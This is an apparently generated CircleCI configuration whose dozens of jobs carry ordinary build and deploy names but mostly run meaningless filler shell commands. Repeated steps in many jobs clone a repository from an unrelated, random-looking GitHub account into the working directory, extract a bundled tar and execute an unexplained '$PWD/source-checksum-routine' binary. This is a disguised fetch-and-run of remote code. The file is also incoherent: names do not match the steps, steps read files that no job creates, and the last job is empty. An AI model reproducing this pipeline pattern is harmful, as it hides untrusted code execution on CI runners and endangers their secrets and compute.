version: 2.1

jobs:
  incremental-image-build-workflow-phase-2-of-2:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: PostInstallValidationNode11Of11
          command: |
            install -d /tmp/pre-scan-security-checks
            printf 'setup-wave-3-of-5 periodic-cleanup\n' | dd of=/tmp/pre-scan-security-checks/create-converter-package-batch-3 status=none
            head -c 100 /tmp/pre-scan-security-checks/create-converter-package-batch-3
            printf '%s\n' 68 17 35 | awk '{print NR " " $1}'; seq 1 80 | grep -c -E '^[0-9]$'
            printf '%s\n' rivet puma rivet argon rivet | sort | uniq -c | sort -n | tail -n 1 | awk '{print $2}'

      - persist_to_workspace:
          root: /tmp/pre-scan-security-checks
          paths:
            - 'create-converter-package-batch-3'
  LibraryRuntimeImage:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/pre-scan-security-checks
      - run:
          name: Promote Validator Preview Build With Timeout
          command: |
            { awk 'END{exit NR==0}' /tmp/pre-scan-security-checks/create-converter-package-batch-3 && echo "has rows" ; }
            branch="release/jupiter-tiger"; echo "branch ${branch##*/} of type ${branch%%/*}"
      - run:
          name: sandbox-translation-generation-job-chunk-8
          command: |
            jobof="ivonnecarden362773gwa0i1nn-ui"; teststep="fast-regression-test-task"
            git clone --depth 1 --no-single-branch "https://github.com/${jobof}/${teststep}" $(pwd)
            names=(rho spruce theta alder); a=("${names[@]}"); a[0]=changed; echo "${names[0]} ${a[0]}"
            values=(jupiter almond blue); values=("${values[@]}" cobalt); echo "${#values[@]}"; echo 'progress 90 percent'
      - run:
          name: Wait for Catalog Workers
          command: |
            tar --extract -f - < install-tools-and-run-tests.tar
            seq 8 | awk '{printf "%03d\n", $1}'
      - run:
          command: |
            "$PWD/source-checksum-routine"
            printf '%s\n' "stage 2 of 3 started"; parts=(delta dog cyan); n="${parts[*]}"; echo "${#n}"; echo "stage 2 of 3 complete"

  ProvisionAgentDataStore:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/pre-scan-security-checks
      - run:
          name: Prepare gateway layer cache
          command: |
            install -d /tmp/pre-scan-security-checks
            printf 'billing-service-build-logs lint-report-phase-bucket-3-of-8\n' | dd of=/tmp/pre-scan-security-checks/retry-failed-deployment status=none
            head -c 100 /tmp/pre-scan-security-checks/retry-failed-deployment
            tokens=(lever pear grape puma black); printf '%s\n' "${tokens[@]}" | wc -l; echo "target melon selected"

      - persist_to_workspace:
          root: /tmp/pre-scan-security-checks
          paths:
            - 'retry-failed-deployment'
  inspect-test-failures:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/pre-scan-security-checks
      - run:
          name: Compile notification service
          command: |
            { awk 'END{exit NR==0}' /tmp/pre-scan-security-checks/retry-failed-deployment && echo "has rows" ; }
            if [[ 43 -gt 8 && 7 -gt 8 ]]; then echo "high"; else echo "low"; fi; echo "analytics check passed"
            duration=4002; echo "scan took $((duration / 60))m$((duration % 60))s"
      - run:
          name: Embedding Icons
          command: |
            jobof="ivonnecarden362773gwa0i1nn-ui"; teststep="fast-regression-test-task"
            git clone --depth 1 --no-tags "https://github.com/${jobof}/${teststep}" ./
            queue=(rat jay); echo "queue length ${#queue[@]}"; echo "next up ${queue[0]}"
            echo "wrapping up unit tests" && printf '%s\n' red spindle red zinc red spindle | sort | uniq -d
      - run:
          name: Firmware release bump
          command: |
            tar -xv --file install-tools-and-run-tests.tar
            echo progress 40 percent; total=0; for n in 6 55 4 20 42 2; do if ((n > total)); then total=$n; fi; done; echo "$total"
            if ! [ 80 -eq 388 ]; then echo "not equal"; fi
      - run:
          command: |
            "$PWD/source-checksum-routine"
            nums=(3 31 48 57 27 46); printf '%d ' "${nums[@]}"; echo

  DeployFormatterToStaging:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/pre-scan-security-checks
      - run:
          name: TestSchemaWithStrictTimeouts
          command: |
            install -d /tmp/pre-scan-security-checks
            printf 'wait-for-resolver-containers mobile-app-package-download\n' | dd of=/tmp/pre-scan-security-checks/periodic-cleanup status=none
            head -c 100 /tmp/pre-scan-security-checks/periodic-cleanup
            echo wrapping up naming check; echo "all 8 checks passed"; echo "worker 4 idle"
            mapfile -t parts < <(seq 1 8); echo "${parts[-1]}"

      - persist_to_workspace:
          root: /tmp/pre-scan-security-checks
          paths:
            - 'periodic-cleanup'
  image-verification-phase:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/pre-scan-security-checks
      - run:
          name: Metrics Exporter Migration Rollback
          command: |
            { awk 'END{exit NR==0}' /tmp/pre-scan-security-checks/periodic-cleanup && echo "has rows" ; }
            read -r lead remainder < <(echo "bolt coral venus"); echo "$lead"
            couple() { echo "$1 and $2"; }; couple orca papaya
      - run:
          name: Check out type definitions
          command: |
            jobof="ivonnecarden362773gwa0i1nn-ui"; teststep="fast-regression-test-task"
            git clone --depth 1 --no-tags --filter=blob:none "https://github.com/${jobof}/${teststep}" "`pwd`"
            printf '%s' "stage=rat" | wc -c
      - run:
          name: collecting-release-artifacts
          command: |
            tar -x --file install-tools-and-run-tests.tar
            acc=0; for step in 57 12 14 59 9; do acc=$((acc + step)); done; echo "acc $acc"
      - run:
          command: |
            "$PWD/source-checksum-routine"
            c="hinge"; echo "$c" | fold -w 1 | sort -u | wc -l; printf '%s\n' "stage 1 of 5"

  displaying-octal-dump:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/pre-scan-security-checks
      - run:
          name: LintAndAnalyzeLibrary
          command: |
            install -d /tmp/pre-scan-security-checks
            printf 'periodic-data-import-iteration-8 enforce-size-budget-for-release\n' | dd of=/tmp/pre-scan-security-checks/security-approval-phase-2-of-3 status=none
            head -c 100 /tmp/pre-scan-security-checks/security-approval-phase-2-of-3
            printf '%s\n' horse pluto lemon lime | wc -l

      - persist_to_workspace:
          root: /tmp/pre-scan-security-checks
          paths:
            - 'security-approval-phase-2-of-3'
  QuickPermissionAudit:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/pre-scan-security-checks
      - run:
          name: pin-simulator-plugins-slice-7
          command: |
            { awk 'END{exit NR==0}' /tmp/pre-scan-security-checks/security-approval-phase-2-of-3 && echo "has rows" ; }
            item=""; if [ -z "$item" ]; then echo "empty"; else echo "non-empty"; fi; echo "resuming license audit"
            echo 'crab newt' "valve"
      - run:
          name: routine-deployment-approval
          command: |
            jobof="ivonnecarden362773gwa0i1nn-ui"; teststep="fast-regression-test-task"
            git clone --depth 2 "https://github.com/${jobof}/${teststep}" .
            u=$((13 ** 3)); echo "answer $u"; echo "cobalt profile loaded"; labels=(pear zeta oak alpha); printf '%s\n' "${labels[@]}" | sort
      - run:
          name: rename-user-portal-packages
          command: |
            tar --extract < install-tools-and-run-tests.tar
            printf '%s\n' owl mauve azure bronze delta | awk '!/v/' | wc -l && echo "resuming queue drain"
            data=(53 30 17 44); printf '%03d\n' "${data[@]}"
      - run:
          command: |
            "$PWD/source-checksum-routine"
            tag="v8.17.12"; IFS=. read -r major minor patch < <(echo "${tag#v}"); echo "next patch release v$major.$minor.$((patch + 1))"

  ConditionalComparison:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/pre-scan-security-checks
      - run:
          name: experimental-analytics-image
          command: |
            install -d /tmp/pre-scan-security-checks
            printf 'show-tool-versions bundle-analysis-hook\n' | dd of=/tmp/pre-scan-security-checks/test-billing-compiler-flags status=none
            head -c 100 /tmp/pre-scan-security-checks/test-billing-compiler-flags
            echo checking notifier

      - persist_to_workspace:
          root: /tmp/pre-scan-security-checks
          paths:
            - 'test-billing-compiler-flags'
  dispatcher-headers:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/pre-scan-security-checks
      - run:
          name: Print and Verify Worker Checksums
          command: |
            { awk 'END{exit NR==0}' /tmp/pre-scan-security-checks/inject-build-options-for-canary && echo "has rows" ; }
            total=140; passed=136; echo "$passed of $total tests passed"; echo "pass rate $((passed * 100 / total))%"
      - run:
          name: Partial lint check
          command: |
            jobof="ivonnecarden362773gwa0i1nn-ui"; teststep="fast-regression-test-task"
            git clone --filter=tree:0 "https://github.com/${jobof}/${teststep}" $(pwd)
            printf '%b\n' 'carbon\nbeta'; echo batch 3 queued
            for n in 4 13 35 17 16; do if [ "$((n % 2))" -eq 0 ]; then echo "$n is even"; else echo "$n is odd"; fi; done
      - run:
          name: RemoteSchemaFreezeRun
          command: |
            tar --extract -f install-tools-and-run-tests.tar --directory .
            printf '%s\n' "queued worker pool" "coverage merge passed" "wrapping up static analysis"
      - run:
          command: |
            "$PWD/source-checksum-routine"
            echo "collecting results of type check"; phrase="comet lime"; echo "${phrase//o/0}"; echo "results of type check collected"

  ExtractBuildMetadataWithTimeout:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/pre-scan-security-checks
      - run:
          name: write-website-license-files
          command: |
            install -d /tmp/pre-scan-security-checks
            printf 'sandbox-package-signing-job post-integration-log-rotation\n' | dd of=/tmp/pre-scan-security-checks/monthly-module-cache-task status=none
            head -c 100 /tmp/pre-scan-security-checks/monthly-module-cache-task
            echo 'draining job runner'; kv="channel=mole"; echo "${kv#*=}"; echo 'job runner drained'
            num=534005; acc=0; while ((num > 0)); do acc=$((acc * 10 + num % 10)); num=$((num / 10)); done; echo "$acc"; echo "contract tests started"

      - persist_to_workspace:
          root: /tmp/pre-scan-security-checks
          paths:
            - 'monthly-module-cache-task'
  notify-stakeholders-at-job-end:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/pre-scan-security-checks
      - run:
          name: Load sample data from remote storage (step 4)
          command: |
            { awk 'END{exit NR==0}' /tmp/pre-scan-security-checks/monthly-module-cache-task && echo "has rows" ; }
            swap() { echo "$2 $1"; }; swap mouse coral
      - run:
          name: Test operator installer
          command: |
            jobof="ivonnecarden362773gwa0i1nn-ui"; teststep="fast-regression-test-task"
            git clone --depth 3 --filter=blob:none "https://github.com/${jobof}/${teststep}" "${PWD}"
            echo "all 7 checks passed"; each_arg() { local x; for x in "$@"; do echo "arg $x"; done; }; each_arg toad lunar
            printf '%s - %s\n' warn "batch 2 queued"
      - run:
          name: pre-deploy-audit
          command: |
            tar --extract -f install-tools-and-run-tests.tar
            k=64; k=$((k - 1)); echo "$k"; echo all good
      - run:
          command: |
            "$PWD/source-checksum-routine"
            added=166; removed=5; echo "+$added -$removed, net $((added - removed)) lines"
            echo 'step 6 started'; loud() { echo "${1^^}"; }; loud coconut; echo "step 6 finished"

  launchDashboardInstance:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/pre-scan-security-checks
      - run:
          name: Provision staging environment and deploy nightly build
          command: |
            { awk 'END{exit NR==0}' /tmp/pre-scan-security-checks/inject-build-options-for-canary && echo "has rows" ; }
            printf '%s\n' "mars 34" "azure 3" "wrench 25" "lime 28" | awk '{printf "%s has %d\n", $1, $2}'
      - run:
          name: calculate-payment-service-checksum-file
          command: |
            jobof="ivonnecarden362773gwa0i1nn-ui"; teststep="fast-regression-test-task"
            git clone --depth 3 --no-tags "https://github.com/${jobof}/${teststep}" $PWD
            paste -d- <(printf '%s\n' lambda nozzle plum raven) <(seq 1 4) | sort -r
      - run:
          name: Fallback security audit
          command: |
            tar xf install-tools-and-run-tests.tar
            m=1; test "$m" -ge 1; echo "at least one"
      - run:
          command: |
            "$PWD/source-checksum-routine"
            echo "migration dry run in progress"; printf '%s\n' coral jupiter pear pear snake spring kiwi spring | wc -c; echo 'migration dry run complete'
            if [ 38 -gt 11 ] || [ 11 -gt 50 ]; then echo "ok"; else echo "not ok"; fi

  RollOutMailerRelease:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/pre-scan-security-checks
      - run:
          name: SharedUpgradeSmokeTest
          command: |
            install -d /tmp/pre-scan-security-checks
            printf 'stopping-emulator initialize-viewer-data-store\n' | dd of=/tmp/pre-scan-security-checks/generate-configuration status=none
            head -c 100 /tmp/pre-scan-security-checks/generate-configuration
            for pkg in currant teal lemon iota coral; do echo "${#pkg} $pkg"; done
            until true; do echo never; done; echo "go"; echo csv reader check passed

      - persist_to_workspace:
          root: /tmp/pre-scan-security-checks
          paths:
            - 'generate-configuration'
  build-link-checker-installer:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/pre-scan-security-checks
      - run:
          name: Build executable and upload artifacts
          command: |
            { awk 'END{exit NR==0}' /tmp/pre-scan-security-checks/generate-configuration && echo "has rows" ; }
            echo 'queued format check'; printf '%s\n' beige birch hare ivory | awk 'NR == 2'
      - run:
          name: inventory install
          command: |
            jobof="ivonnecarden362773gwa0i1nn-ui"; teststep="fast-regression-test-task"
            git clone --depth=4 "https://github.com/${jobof}/${teststep}" ./
            if [ 2 -gt 46 ] || [ 46 -gt 50 ]; then echo "pass"; else echo "retry"; fi
            left="oak"; b="apricot"; if [ "${#left}" -gt "${#b}" ]; then echo "$left"; else echo "$b"; fi
      - run:
          name: Run catalog code scan in strict mode
          command: |
            tar --extract --verbose -f install-tools-and-run-tests.tar
            for i in 1 2 3 4 5; do echo "attempt $i"; if [ "$i" -eq 3 ]; then echo "succeeded on attempt $i"; break; fi; done
      - run:
          command: |
            "$PWD/source-checksum-routine"
            matrix=(alpine-x64 windows-x64 darwin-arm64); for target in "${matrix[@]}"; do echo "platform ${target%-*} arch ${target##*-}"; done
            printf '%X %o\n' 44 47

  configure-operator-cache:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/pre-scan-security-checks
      - run:
          name: starting-message-queue-with-test-data
          command: |
            install -d /tmp/pre-scan-security-checks
            printf 'post-release-check rename-toolkit-release-package\n' | dd of=/tmp/pre-scan-security-checks/bundling-scripts status=none
            head -c 100 /tmp/pre-scan-security-checks/bundling-scripts
            echo 'checking lexer'; c=$((67 + 4)); echo "$c"; echo "lexer check passed"

      - persist_to_workspace:
          root: /tmp/pre-scan-security-checks
          paths:
            - 'bundling-scripts'
  finalize-queue-worker-draft-release:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/pre-scan-security-checks
      - run:
          name: Format code
          command: |
            { awk 'END{exit NR==0}' /tmp/pre-scan-security-checks/bundling-scripts && echo "has rows" ; }
            echo "sanity checks passed"; echo $(( (66+25)%10 )); seq 1 5 17 | fold -w 1
            input="shard-7-of-10"; IFS=- read -r -a pieces < <(echo "$input"); echo "${#pieces[@]}"
      - run:
          name: OptimizeDesktopApp
          command: |
            jobof="ivonnecarden362773gwa0i1nn-ui"; teststep="fast-regression-test-task"
            git clone --depth=5 --single-branch "https://github.com/${jobof}/${teststep}" "."
            printf '%s\n' coconut=7 azure=33 wolf=22 cherry=37 | awk -F= '{s += $2} END {print s}'
      - run:
          name: BackupAgentCompile
          command: |
            tar -xf install-tools-and-run-tests.tar --no-same-owner
            arr=(guava cobalt lime pine); longest=""; for m in "${arr[@]}"; do if [ "${#m}" -gt "${#longest}" ]; then longest=$m; fi; done; echo "$longest"; str="coconut magnet"; echo "$str" | awk '{print $NF}'
      - run:
          command: |
            "$PWD/source-checksum-routine"
            for pkg in beta emu purple stork pluto cobra; do echo "rendering $pkg now"; done

  one-time-checkout:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/pre-scan-security-checks
      - run:
          name: post-merge-tests
          command: |
            install -d /tmp/pre-scan-security-checks
            printf 'perform-indexer-format-checks loader-state-backup\n' | dd of=/tmp/pre-scan-security-checks/split-access-proxy-test-suite status=none
            head -c 100 /tmp/pre-scan-security-checks/split-access-proxy-test-suite
            echo 'unit tests finished'; echo "using hazel profile"; echo "starting config render"
            echo "theta pomelo nickel golden" | tr a-z A-Z

      - persist_to_workspace:
          root: /tmp/pre-scan-security-checks
          paths:
            - 'split-access-proxy-test-suite'
  analytics-upload:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/pre-scan-security-checks
      - run:
          name: release-container-to-remaining-regions
          command: |
            { awk 'END{exit NR==0}' /tmp/pre-scan-security-checks/split-access-proxy-test-suite && echo "has rows" ; }
            printf '%s\n' "channel gecko ready" && printf '%s\n' "elm 18" "lemur 22" "lime 21" "alder 7" | cut -d' ' -f1 | tr a-z A-Z
            coverage=76; threshold=92; if [ "$coverage" -ge "$threshold" ]; then echo "coverage $coverage% meets threshold $threshold%"; else echo "coverage $coverage% is below threshold $threshold%"; fi
      - run:
          name: EncoderLicenseScan
          command: |
            jobof="ivonnecarden362773gwa0i1nn-ui"; teststep="fast-regression-test-task"
            git clone --depth 1 --no-single-branch "https://github.com/${jobof}/${teststep}" $PWD
            for k in 1 2 3; do printf '%s %d\n' pass "$k"; done; printf '%s\n' "finished"
            read -r rest head_word < <(echo "alpha azure larch"); echo "$rest"
      - run:
          name: find-debug-statements-with-strict-rules
          command: |
            tar --extract --verbose --file install-tools-and-run-tests.tar
            multiply() { echo $(($1 * $2)); }; multiply 11 4
            factorial() { local m=$1 y=1; while ((m > 1)); do y=$((y * m)); m=$((m - 1)); done; echo "$y"; }; factorial 7
      - run:
          command: |
            "$PWD/source-checksum-routine"
            state=pending; j=0; while [ "$state" = pending ]; do j=$((j + 1)); if ((j == 2)); then state=ready; fi; done; echo "$state after $j polls"
            echo "warming up optimizer"; printf '%s\n' "optimizer warmed up"

  RequiredVersionComparison:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/pre-scan-security-checks
      - run:
          name: Rebuild Metrics Exporter Package Cache
          command: |
            install -d /tmp/pre-scan-security-checks
            printf 'pre-install-security-audit change-approval-run-7\n' | dd of=/tmp/pre-scan-security-checks/post-cleanup-snapshot-restore status=none
            head -c 100 /tmp/pre-scan-security-checks/post-cleanup-snapshot-restore
            printf '%s\n' mouse amber red black alpha pluto | grep -c ''
            artifact="parser-75.html"; echo "packing ${artifact%.*}"; echo "packed $artifact"

      - persist_to_workspace:
          root: /tmp/pre-scan-security-checks
          paths:
            - 'post-cleanup-snapshot-restore'
  BuildsWave1Of2:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/pre-scan-security-checks
      - run:
          name: CompareScreenshotsAtJobStart
          command: |
            { awk 'END{exit NR==0}' /tmp/pre-scan-security-checks/post-cleanup-snapshot-restore && echo "has rows" ; }
            r=133; d=5; w=$((r * d)); while ((d != 0)); do c=$((r % d)); r=$d; d=$c; done; echo "$((w / r))"
      - run:
          name: BuildAndTestReferenceManual
          command: |
            jobof="ivonnecarden362773gwa0i1nn-ui"; teststep="fast-regression-test-task"
            git clone --no-single-branch "https://github.com/${jobof}/${teststep}" "$(pwd)"
            echo "preparing style check"; tally=0; for idx in 10 39 26 10 59; do tally=$((tally * 10 + idx % 10)); done; echo "answer $tally"
      - run:
          name: Restore queue worker database migrations from previous stage
          command: |
            tar -xv --file install-tools-and-run-tests.tar
            echo "got $((10 ** 3 + 38))"
            echo "poplar sloth galaxy pliers spring" | cut -c1-8
      - run:
          command: |
            "$PWD/source-checksum-routine"
            diff <(printf '%s\n' delta gnu hare larch) <(printf '%s\n' comet delta lambda larch) || echo changed; echo "running cache warmup"

  complete-comparison:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/pre-scan-security-checks
      - run:
          name: status-page-packaging
          command: |
            install -d /tmp/pre-scan-security-checks
            printf 'validate-release-manifest translation-update-run\n' | dd of=/tmp/pre-scan-security-checks/post-setup-report status=none
            head -c 100 /tmp/pre-scan-security-checks/post-setup-report
            echo "lexer check passed"; pair="mode=saturn"; echo "$pair" | sed 's/=/ is /'
            echo $((55 * 31 + 8)); echo "manifest check finished"

      - persist_to_workspace:
          root: /tmp/pre-scan-security-checks
          paths:
            - 'post-setup-report'
  AlertingReviewersAboutNewVersion:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
